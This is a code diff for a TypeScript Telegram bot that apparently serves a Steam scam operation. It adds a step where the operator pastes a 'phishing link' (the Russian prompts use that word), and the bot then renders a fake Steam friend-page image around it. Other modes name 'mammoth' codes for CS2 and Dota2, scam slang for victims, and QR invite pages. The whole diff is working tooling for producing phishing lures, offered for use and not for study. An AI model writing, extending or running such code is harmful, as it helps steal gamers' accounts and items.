@@ -33,6 +33,7 @@ type UserFlow =
   | { mode: "draw_input:code_cs2_mammoth_code"; payload: { profileUrl: string; promptMessageId: number | null } }
   | { mode: "draw_input:code_dota2_mammoth_code"; payload: { promptMessageId: number | null } }
   | { mode: "draw_input:qr_page_time"; payload: { inviteLink: string; promptMessageId: number | null } }
+  | { mode: "draw_input:friend_page_normal_link"; payload: { promptMessageId: number | null } }
   | { mode: "draw_input:friend_page_code"; payload: { inviteLink: string; showRegionMismatch: boolean; promptMessageId: number | null } };
 
 type RuntimeWatch = {
@@ -916,6 +917,21 @@ async function handleDrawInput(ctx: Ctx, flow: Extract<UserFlow, { mode: string 
 
   const mode = flow.mode.replace("draw_input:", "");
   const text = rawText.trim();
+
+  if (mode === "friend_page_normal_link") {
+    const parsed = parseHttpUrl(text);
+    if (!parsed) {
+      await ctx.reply("Нужна корректная фишинг-ссылка http/https.");
+      return;
+    }
+    state.delete(ctx.from.id);
+    await runDrawJob(
+      ctx,
+      () => makeSteamFriendPageFromTemplateScreenshot(parsed, { variant: "normal" }),
+      "Не удалось создать страницу друга.",
+    );
+    return;
+  }
 
   if (mode === "qr_page_time") {
     const inviteLink = String((flow as any).payload?.inviteLink || "");
@@ -2840,6 +2856,18 @@ bot.on("callback_query", async (ctx, next) => {
   if (data.startsWith("draw:friend_page:")) {
     const variant = data.includes(":not_found:") ? "not_found" : "normal";
     const showRegionMismatch = data.endsWith(":region_error");
+    if (variant === "normal") {
+      state.set(ctx.from.id, {
+        mode: "draw_input:friend_page_normal_link",
+        payload: { promptMessageId: (ctx.callbackQuery as any)?.message?.message_id || null },
+      });
+      await replaceOrReply(ctx, `<b>Введите фишинг-ссылку.</b>`, {
+        parse_mode: "HTML",
+        reply_markup: Markup.inlineKeyboard([[Markup.button.callback("⬅️ Назад", "draw:friend_page")]]).reply_markup,
+      });
+      await ctx.answerCbQuery().catch(() => null);
+      return;
+    }
     const phishingLink = await getRequiredPhishingLink(ctx, me);
     if (!phishingLink) {
       await ctx.answerCbQuery().catch(() => null);
@@ -2857,15 +2885,6 @@ bot.on("callback_query", async (ctx, next) => {
       await ctx.answerCbQuery().catch(() => null);
       return;
     }
-    state.delete(ctx.from.id);
-    await ctx.answerCbQuery().catch(() => null);
-    await runDrawJob(
-      ctx,
-      () => makeSteamFriendPageFromTemplateScreenshot(phishingLink, { variant: "normal" }),
-      "Не удалось создать страницу друга.",
-    );
-    await ctx.answerCbQuery().catch(() => null);
-    return;
   }
 
   await next();
